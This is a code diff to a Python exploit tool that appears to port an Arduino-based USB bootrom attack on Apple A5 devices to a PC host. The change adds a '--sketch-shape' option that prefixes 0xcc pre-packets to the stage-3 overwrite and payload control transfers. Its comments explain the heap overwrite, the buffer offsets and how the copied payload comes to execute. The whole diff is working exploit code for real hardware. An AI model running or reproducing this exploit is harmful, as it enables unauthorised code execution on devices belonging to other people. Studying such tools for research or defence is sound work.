@@ -724,20 +724,38 @@ def stage3(usb, serial_idx, payload, overwrite, spin_us, debug, crit_us=None):
         raise SystemExit('error: critical IN completed — its status ZLP reset the '
                          'global USB state; the exploit cannot continue')
     # (i)/(j) The overwrite and payload are sent as complete control
-    # transfers.  The overwrite (invalid SETUP GET_STATUS + 0x40 OUT) lands at
-    # io_buffer offset 0x6C0 and completes the transfer (0x6C0+0x40 = 0x700 =
-    # length): end_of_transfer fires, the io_buffer is copied and the globals
-    # reset, so its status phase is harmless.  The payload DNLOAD then re-arms
-    # the globals (length=0x2C0) and completes the same way, and the copied
-    # payload executes.  (The Arduino's 0xcc "pre-packets" only flip the
-    # MAX3421E data toggle; a PC host already sends DATA1 after SETUP, so
-    # sending them here would shift the payload and break its addresses.)
-    rc = usb.ctrl(handle, 0x00, 0x00, 0, 0, overwrite, 100)
-    if debug:
-        print('    [debug] overwrite OUT      ctrl rc=%d' % rc)
-    rc = usb.ctrl(handle, 0x21, REQ_DNLOAD, 0, 0, payload, 1000)
-    if debug:
-        print('    [debug] payload OUT        ctrl rc=%d' % rc)
+    # transfers.  Two shapes are supported:
+    #
+    # default — the port author's model: the overwrite (invalid SETUP
+    # GET_STATUS + 0x40 OUT) lands at io_buffer offset padding and completes
+    # the poisoned DNLOAD (padding+0x40 = length): end_of_transfer fires, the
+    # io_buffer is copied and the globals reset, so its status phase is
+    # harmless.  The payload DNLOAD then re-arms the globals the same way.
+    #
+    # sketch-shape — wire-exact emulation of the Arduino: every stage-3
+    # transfer is preceded by a 0x80/0x40 'pre-packet' that occupies the
+    # first 0x40 bytes of the control transfer's data phase.  The xHCI caps
+    # a control transfer at wLength, so the pre-packet is delivered by
+    # raising wLength by 0x40 and prefixing the 0xcc bytes: the byte counts
+    # on the wire then match the sketch's raw token stream exactly
+    # (overwrite: SETUP(0x00,0x00,0x40) + 0x80 bytes; payload: SETUP(DNLOAD,
+    # wLength=sizeof(payload)) + 0x40 + sizeof(payload) bytes), which is how
+    # the Arduino's device-side heap spill is reached.
+    if getattr(stage3, 'sketch_shape', False):
+        rc = usb.ctrl(handle, 0x00, 0x00, 0, 0, b'\xcc' * 0x40 + overwrite, 100)
+        if debug:
+            print('    [debug] overwrite OUT      ctrl rc=%d' % rc)
+        rc = usb.ctrl(handle, 0x21, REQ_DNLOAD, 0, 0,
+                      b'\xcc' * 0x40 + payload, 1000)
+        if debug:
+            print('    [debug] payload OUT        ctrl rc=%d' % rc)
+    else:
+        rc = usb.ctrl(handle, 0x00, 0x00, 0, 0, overwrite, 100)
+        if debug:
+            print('    [debug] overwrite OUT      ctrl rc=%d' % rc)
+        rc = usb.ctrl(handle, 0x21, REQ_DNLOAD, 0, 0, payload, 1000)
+        if debug:
+            print('    [debug] payload OUT        ctrl rc=%d' % rc)
     reset_and_release(usb, handle, settle=0.5)
 
 
@@ -830,6 +848,7 @@ def exploit(args):
     if args.stage in ('all', '2'):
         stage2(usb, args.out_spin_us, args.padding, args.debug)
     if args.stage in ('all', '3'):
+        stage3.sketch_shape = bool(getattr(args, 'sketch_shape', False))
         stage3(usb, serial_idx, payload, overwrite, args.spin_us, args.debug,
                crit_us=getattr(args, 'crit_us', None))
     serial = verify(usb)
@@ -1046,6 +1065,10 @@ def main():
     parser.add_argument('--selftest', action='store_true', help='check payload hashes and exit')
     parser.add_argument('--payload', choices=sorted(PAYLOAD_FILES), default='classic',
                         help='prebuilt A5 payload variant (default: classic)')
+    parser.add_argument('--sketch-shape', action='store_true', default=False,
+                        help='emulate the Arduino stage-3 wire exactly: prepend '
+                             'the 0xcc pre-packet to the overwrite and payload '
+                             'transfers (wLength += 0x40, data prefixed)')
     parser.add_argument('--leak', type=int, default=A5_LEAK_COUNT,
                         help='heap feng shui leak count (default: %(default)s)')
     parser.add_argument('--leak-delay-ms', type=float, default=2.0,
